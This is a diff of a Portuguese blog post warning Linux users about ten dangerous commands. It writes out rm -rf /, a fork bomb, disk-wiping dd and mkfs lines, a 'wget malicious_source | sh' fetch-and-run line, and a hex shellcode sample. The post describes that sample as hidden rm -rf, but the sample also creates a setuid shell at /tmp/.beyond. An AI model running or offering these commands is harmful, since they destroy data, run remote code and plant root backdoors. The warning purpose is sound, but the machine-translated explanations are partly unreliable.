@@ -15,6 +15,112 @@ blogger_orig_url: http://www.terminalroot.com.br/2015/06/10-comandos-perigosos-q
 ---
 
 <p>
-<div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-sUxloEQu3Hk/VXMhV6pYrzI/AAAAAAAABXQ/GZtaD2TIzxc/s1600/bash_forkbomb_wallpaper_by_kodadog-d4tc79m.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="250" src="http://4.bp.blogspot.com/-sUxloEQu3Hk/VXMhV6pYrzI/AAAAAAAABXQ/GZtaD2TIzxc/s400/bash_forkbomb_wallpaper_by_kodadog-d4tc79m.png" width="400" /></a></div></p><p></p><p><b></p><p>A linha de comando no <span style="color: red;">GNU/Linux</span> é muito produtiva, útil e interessante, no entanto, às vezes pode ser muito perigoso, principalmente se tratando do usuário <span style="color: red;">root</span>, ou do usuário que pode assumir a maioria dos seus privilégios, o sudo. É necessário saber exatamente o que está fazendo. Esse artigo serve para alertá-los sobre alguns comandos do terminal, para não executá-los.</b></p><p></p><p></p><p><h3><span style="font-size: x-large;"><b>1. rm -rf</b></span></h3><b></p><p>O comando rm -rf é um dos maneira mais rápida de eliminar uma pasta e seu conteúdo. Mas um pouco de erro de digitação ou ignorância pode resultar em danos no sistema irrecuperáveis. Algumas das opções usadas com o comando rm é: </p><p></p><p>{% highlight bash %}# rm -rf{% endhighlight %}</p><p></p><p>comando rm no Linux é usado para apagar arquivos.</p><p></p><p>&nbsp;&nbsp;&nbsp;&nbsp; <span style="color: blue;">rm -r</span> comando exclui a pasta de forma recursiva, mesmo a pasta vazia.</p><p>&nbsp;&nbsp;&nbsp;&nbsp; comando rm -f remove "apenas ler o arquivo 'sem perguntar.</p><p>&nbsp;&nbsp;&nbsp;&nbsp; <span style="color: blue;">rm-rf /</span> : Força eliminação de tudo no diretório raiz.</p><p>&nbsp;&nbsp;&nbsp;&nbsp; <span style="color: blue;">rm -rf *</span> : Força eliminação de tudo no atual diretório diretório / trabalho.</p><p>&nbsp;&nbsp;&nbsp;&nbsp; <span style="color: blue;">rm -rf&nbsp;</span> : Força supressão do atual diretórios e subdiretórios.</p><p></p><p>Por isso, tenha cuidado quando você está executando o comando <span style="color: red;">rm -rf</span>. Para evitar um acidente de excluir arquivos com o comando 'rm', crie um alias de comando <i>'rm'</i> como <i>'rm -i'</i> <i>".bashrc"</i>, ele irá pedir-lhe para confirmar cada exclusão.</p><p></b></p><p><h3><span style="font-size: x-large;"><b>2. :(){:|:&amp;};:</b></span></h3><b></p><p>{% highlight bash %}# :(){:|:&amp;};:{% endhighlight %}</p><p></p><p>A descrição acima é o <span style="color: red;"><span style="font-size: large;">fork bomb</span></span>. Ele opera através da definição de uma função chamada <i>':'</i>, que se chama duas vezes, uma no primeiro plano e uma vez no fundo. Ele mantém em execução novamente e novamente até que o sistema congela.</b></p><p><b></p><p></b><b></p><p></b><h3><span style="font-size: x-large;"><b>3. comando &gt; /dev/sda</b></span></h3><b></p><p>O comando acima escreve a saída do 'comando' no bloco <i>/dev/sda</i>. O comando acima escreve dados brutos e todos os arquivos no bloco serão substituídos por dados brutos, resultando em perda total dos dados no bloco.</b></p><p></p><p></p><p><h3><span style="font-size: x-large;"><b>4. mv diretorio /dev/null</b></span></h3><b></p><p>Tudo movido para <span style="color: red;"><span style="font-size: large;">/dev/null</span></span>, desaparece do sistema.</p><p></p><p>{% highlight bash %}# mv /home/user/* /dev/null{% endhighlight %}</b></p><p><h3><span style="font-size: x-large;"><b>5. wget http://malicious_source -O- | sh</b></span></h3><b></p><p>O comando acima irá baixar um script a partir de uma fonte mal-intencionada e, em seguida, executá-lo. Comando wget irá baixar o script e sh irá executar o script baixado.</b></p><p><blockquote><b></p><p></b><b>Nota: Você deve ser muito consciente da fonte de onde você está baixando pacotes e scripts. Só use esses scripts/aplicações que é baixado de uma fonte confiável.</b></blockquote><b></p><p></b><h3><span style="font-size: x-large;"><b>6. mkfs.ext3 /dev/sda</b></span></h3><b></p><p>{% highlight bash %}# mkfs.ext3 /dev/sda{% endhighlight %}</p><p></p><p>O comando acima irá danificar os blocos do seu HD, e formatá-lo.</p><p></b></p><p><h3><b><span style="font-size: x-large;">7. &gt; arquivo</span></b></h3><b></p><p>{% highlight bash %}# echo "Nada" &gt; arquivo.conf{% endhighlight %}</p><p></p><p>Qual arquivo importante do sistema, será substituído com esse redirecionador.</p><p></p><p>A forma exata de usá-lo é criar um arquivo backup:</p><p></p><p>{% highlight bash %}# cp arquivo arquivo.bkp{% endhighlight %}</p><p></p><p>e redirecionar com 2 "maiores que", <span style="color: blue;"><span style="font-size: large;">&gt;&gt;</span></span> , se necessário, exemplo para um source.list:</p><p></p><p>{% highlight bash %}# echo "link pacote deb" &gt;&gt; /etc/apt/source.list{% endhighlight %}</b></p><p><h3><span style="font-size: x-large;"><b>8. ^foo^bar</b></span></h3><b></p><p>Este comando é usado para editar o comando anterior sem a necessidade de digitar novamente todo o comando novamente. Mas isso realmente pode ser problemático se você não tomou o risco de verificar cuidadosamente a mudança no comando original usando ^ ^ foo comando bar.</b></p><p><b></p><p></b><b></p><p></b><h3><b><span style="font-size: x-large;">9. dd if=/dev/random of=/dev/sda</span></b></h3><b></p><p>{% highlight bash %}# dd if=/dev/random of=/dev/sda{% endhighlight %}</p><p></p><p>O comando acima irá acabar com como <i>/dev/sda</i> e escrever dados aleatórios para o bloco. Claro! Seu sistema seria deixado na fase inconsistente e irrecuperável.</b></p><p><b></p><p></b><b></p><p></b><h3><span style="font-size: x-large;"><b>10. Comando invisível</b></span></h3><b></p><p>O comando abaixo nada mais é que o primeiro comando deste artigo (<span style="color: red;">rm-rf</span>). Aqui os códigos estão escondidos em hex para que um usuário ignorante pode ser enganado. Executando o código abaixo em seu terminal e limpar sua partição raiz.</p><p></p><p>Este comando aqui mostra que a ameaça pode ser escondida e normalmente não detectável, às vezes. Você deve estar ciente de que você está fazendo e qual seria o resultado. Não compilar/rodar códigos a partir de uma fonte desconhecida.</p><p></p><p></p><p>{% highlight bash %}</p><p>&nbsp;&nbsp; &nbsp;char esp[] __attribute__ ((section(“.text”))) /* e.s.p</p><p>&nbsp;&nbsp; &nbsp;release */</p><p>&nbsp;&nbsp; &nbsp;= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″</p><p>&nbsp;&nbsp; &nbsp;“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″</p><p>&nbsp;&nbsp; &nbsp;“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″</p><p>&nbsp;&nbsp; &nbsp;“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″</p><p>&nbsp;&nbsp; &nbsp;“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″</p><p>&nbsp;&nbsp; &nbsp;“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″</p><p>&nbsp;&nbsp; &nbsp;“\x6e\x2f\x73\x68\x00\x2d\x63\x00″</p><p>&nbsp;&nbsp; &nbsp;“cp -p /bin/sh /tmp/.beyond; chmod 4755</p><p>&nbsp;&nbsp; &nbsp;/tmp/.beyond;”;{% endhighlight %}</p><p></p><p></b></p><p><blockquote class="tr_bq"><b><span style="color: red;"><span style="font-size: large;">NÃO EXECUTE NENHUM COMANDO ACIMA, CASO QUEIRA TESTÁ-LOS, UTILIZE UM A MÁQUINA VIRTUAL PARA TESTES</span></span></b></blockquote></p><p></p><p><span style="color: #999999;"><i><span style="font-size: x-small;">Via: http://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/</span></i></span>
+<div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-sUxloEQu3Hk/VXMhV6pYrzI/AAAAAAAABXQ/GZtaD2TIzxc/s1600/bash_forkbomb_wallpaper_by_kodadog-d4tc79m.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="250" src="http://4.bp.blogspot.com/-sUxloEQu3Hk/VXMhV6pYrzI/AAAAAAAABXQ/GZtaD2TIzxc/s400/bash_forkbomb_wallpaper_by_kodadog-d4tc79m.png" width="400" /></a></div>
+
+<b>
+A linha de comando no <span style="color: red;">GNU/Linux</span> é muito produtiva, útil e interessante, no entanto, às vezes pode ser muito perigoso, principalmente se tratando do usuário <span style="color: red;">root</span>, ou do usuário que pode assumir a maioria dos seus privilégios, o sudo. É necessário saber exatamente o que está fazendo. Esse artigo serve para alertá-los sobre alguns comandos do terminal, para não executá-los.</b>
+
+
+<h3><span style="font-size: x-large;"><b>1. rm -rf</b></span></h3><b>
+O comando rm -rf é um dos maneira mais rápida de eliminar uma pasta e seu conteúdo. Mas um pouco de erro de digitação ou ignorância pode resultar em danos no sistema irrecuperáveis. Algumas das opções usadas com o comando rm é: 
+
+{% highlight bash %}
+# rm -rf
+{% endhighlight %}
+
+comando rm no Linux é usado para apagar arquivos.
+
+ rm -r comando exclui a pasta de forma recursiva, mesmo a pasta vazia.
+ comando rm -f remove "apenas ler o arquivo 'sem perguntar.
+ rm-rf / : Força eliminação de tudo no diretório raiz.
+ rm -rf * : Força eliminação de tudo no atual diretório diretório / trabalho.
+ rm -rf : Força supressão do atual diretórios e subdiretórios.
+
+Por isso, tenha cuidado quando você está executando o comando rm -rf. Para evitar um acidente de excluir arquivos com o comando 'rm', crie um alias de comando 'rm' como 'rm -i' ".bashrc", ele irá pedir-lhe para confirmar cada exclusão.
+
+2. :(){:|:&amp;};:
+{% highlight bash %}
+# :(){:|:&amp;};:
+{% endhighlight %}
+
+A descrição acima é o <span style="color: red;"><span style="font-size: large;">fork bomb</span></span>. Ele opera através da definição de uma função chamada <i>':'</i>, que se chama duas vezes, uma no primeiro plano e uma vez no fundo. Ele mantém em execução novamente e novamente até que o sistema congela.</b>
+<b>
+</b><b>
+</b><h3><span style="font-size: x-large;"><b>3. comando > /dev/sda</b></span></h3><b>
+O comando acima escreve a saída do 'comando' no bloco <i>/dev/sda</i>. O comando acima escreve dados brutos e todos os arquivos no bloco serão substituídos por dados brutos, resultando em perda total dos dados no bloco.</b>
+
+
+<h3><span style="font-size: x-large;"><b>4. mv diretorio /dev/null</b></span></h3><b>
+Tudo movido para <span style="color: red;"><span style="font-size: large;">/dev/null</span></span>, desaparece do sistema.
+
+{% highlight bash %}
+# mv /home/user/* /dev/null
+{% endhighlight %}
+5. wget http://malicious_source -O- | sh
+O comando acima irá baixar um script a partir de uma fonte mal-intencionada e, em seguida, executá-lo. Comando wget irá baixar o script e sh irá executar o script baixado.
+
+Nota: Você deve ser muito consciente da fonte de onde você está baixando pacotes e scripts. Só use esses scripts/aplicações que é baixado de uma fonte confiável.
+6. mkfs.ext3 /dev/sda
+{% highlight bash %}
+# mkfs.ext3 /dev/sda
+{% endhighlight %}
+
+O comando acima irá danificar os blocos do seu HD, e formatá-lo.
+</b>
+<h3><b><span style="font-size: x-large;">7. > arquivo</span></b></h3><b>
+{% highlight bash %}
+# echo "Nada" > arquivo.conf
+{% endhighlight %}
+
+Qual arquivo importante do sistema, será substituído com esse redirecionador.
+
+A forma exata de usá-lo é criar um arquivo backup:
+
+{% highlight bash %}
+# cp arquivo arquivo.bkp
+{% endhighlight %}
+
+e redirecionar com 2 "maiores que", <span style="color: blue;"><span style="font-size: large;">>></span></span> , se necessário, exemplo para um source.list:
+
+{% highlight bash %}
+# echo "link pacote deb" >> /etc/apt/source.list
+{% endhighlight %}
+8. ^foo^bar
+Este comando é usado para editar o comando anterior sem a necessidade de digitar novamente todo o comando novamente. Mas isso realmente pode ser problemático se você não tomou o risco de verificar cuidadosamente a mudança no comando original usando ^ ^ foo comando bar.
+
+
+9. dd if=/dev/random of=/dev/sda
+{% highlight bash %}
+# dd if=/dev/random of=/dev/sda
+{% endhighlight %}
+
+O comando acima irá acabar com como <i>/dev/sda</i> e escrever dados aleatórios para o bloco. Claro! Seu sistema seria deixado na fase inconsistente e irrecuperável.</b>
+<b>
+</b><b>
+</b><h3><span style="font-size: x-large;"><b>10. Comando invisível</b></span></h3><b>
+O comando abaixo nada mais é que o primeiro comando deste artigo (<span style="color: red;">rm-rf</span>). Aqui os códigos estão escondidos em hex para que um usuário ignorante pode ser enganado. Executando o código abaixo em seu terminal e limpar sua partição raiz.
+
+Este comando aqui mostra que a ameaça pode ser escondida e normalmente não detectável, às vezes. Você deve estar ciente de que você está fazendo e qual seria o resultado. Não compilar/rodar códigos a partir de uma fonte desconhecida.
+
+
+{% highlight bash %}
+
+ char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+ release */
+ = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
+ “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
+ “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
+ “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
+ “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
+ “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
+ “\x6e\x2f\x73\x68\x00\x2d\x63\x00″
+ “cp -p /bin/sh /tmp/.beyond; chmod 4755
+ /tmp/.beyond;”;
+{% endhighlight %}
+
+</b>
+<blockquote class="tr_bq"><b><span style="color: red;"><span style="font-size: large;">NÃO EXECUTE NENHUM COMANDO ACIMA, CASO QUEIRA TESTÁ-LOS, UTILIZE UM A MÁQUINA VIRTUAL PARA TESTES</span></span></b></blockquote>
+
+<span style="color: #999999;"><i><span style="font-size: x-small;">Via: http://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/</span></i></span>
 
 </p>
